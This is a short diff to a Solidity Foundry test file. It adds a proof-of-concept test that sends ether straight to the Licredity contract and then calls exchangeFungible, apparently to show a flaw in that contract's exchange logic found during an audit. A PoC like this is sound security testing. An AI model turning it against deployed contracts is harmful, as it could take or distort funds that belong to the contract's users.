@@ -167,4 +167,9 @@ contract LicredityPositionTest is Deployers {
         vm.expectRevert(NonFungibleNotOwned.selector);
         licredity.depositNonFungible(positionId);
     }
+
+    function test_poc() public {
+        payable(address(licredity)).transfer(1 ether);
+        licredity.exchangeFungible(address(this), true);
+    }
 }
